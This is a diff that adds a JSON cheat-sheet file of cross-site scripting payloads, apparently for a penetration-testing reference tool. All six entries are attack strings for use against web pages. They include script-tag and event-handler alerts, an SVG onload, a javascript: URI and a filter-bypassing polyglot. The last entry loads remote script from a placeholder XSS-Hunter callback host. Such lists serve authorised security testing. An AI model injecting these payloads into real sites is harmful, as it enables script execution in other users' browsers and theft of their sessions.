@@ -1,0 +1,30 @@
+{
+  "category": "Web – Cross-Site Scripting",
+  "description": "Reflected, stored, DOM & filter bypass payloads",
+  "cheats": [
+    {
+      "title": "Classic alert()",
+      "content": "<script>alert(1)</script>"
+    },
+    {
+      "title": "Event handler (no <script>)",
+      "content": "\"><img src=x onerror=alert(1)>"
+    },
+    {
+      "title": "SVG payload",
+      "content": "<svg/onload=confirm(1)>"
+    },
+    {
+      "title": "JS-URI",
+      "content": "javascript:alert(1)"
+    },
+    {
+      "title": "Polyglot that bypasses filters",
+      "content": "\"><svg/onload=';alert`1`'>"
+    },
+    {
+      "title": "XSS-Hunter oob payload",
+      "content": "<script src=//YOUR.xss.ht></script>"
+    }
+  ]
+}
